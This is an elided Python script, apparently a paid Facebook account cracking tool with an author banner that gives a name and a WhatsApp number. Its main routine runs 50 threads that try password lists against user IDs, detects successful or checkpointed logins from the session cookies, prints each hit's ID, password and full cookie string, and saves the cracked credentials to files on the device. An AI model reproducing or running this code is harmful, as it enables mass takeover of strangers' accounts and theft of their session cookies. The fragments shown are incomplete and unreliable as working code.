...
def o():
    ...
    Nafiz = input('     \033[97;1m[\033[92;1m?\033[97;1m] \033[97;1mSelect menu \033[38;5;196m: ')
    if Nafiz == '1':
        i()
    if Nafiz == '2':
        os.system('xdg-open https://github.com/diha2580  ')
    if Nafiz == '3':
        os.system('xdg-open https://github.com/diha2580')
    if Nafiz == 'E':
        os.system('exit')
...
\033[1;32m  ╔═══════════════════════════════════════════════════╗
\033[1;97m  ╠══[Author:=======================> \33[1;38 NAHIAN NAFIZ  \33[1;38m   ║
\033[1;32m  ╠══[Facebook:=====================> MD Nahian Nafiz     ║ 
\033[1;97m  ╠══[Whatsapp:=====================> 01953800351    ║
...
def i():
    ...
    with ThreadPool(max_workers=50) as setu:
        ...
        print('     \033[97;1m[\033[92;1m+\033[97;1m] \033[93;1mFILE SAVE \033[38;5;196m: \033[38;5;46mNafiz-XD-OK.txt')
        print('     \033[97;1m[\033[92;1m+\033[97;1m] \033[93;1mFILE SAVE \033[38;5;196m: \033[38;5;196mNafiz-XD-CP.txt')
        print("     \033[38;5;46m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;32m-\033[1;35m-\033[1;34m-\033[1;97m-\033[1;33m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[38;5;196m-\033[1;32m-\033[1;97m-\033[1;35m-\033[1;34m-\033[1;33m-\033[38;5;46m-\033[1;97m-\033[1;32m-\033[1;33m-\033[38;5;196m-")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print('\033[38;5;46m[Nafiz-OK] ' +uid+ '|' +ps+    '  \n   \033[1;33mCOOKIES : \033[38;5;46m'+coki+ ' ')                
                open('/sdcard/Nafiz-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\033[38;5;46m[Nafix-CP] ' +uid+ '|' +ps+ '  \33[0;97m')
                open('/sdcard/Nafiz-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r    \33[1;93m[\033[1;95mNAFIZ\033[0m/%s\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def Subscraption():
	...
	if key1 in r1:
		...
		print("    \033[97;1m[\033[92;1m•\033[97;1m]\33[0;92mYour Key  :\033[1;94m "+ak+Nafiz+key1)
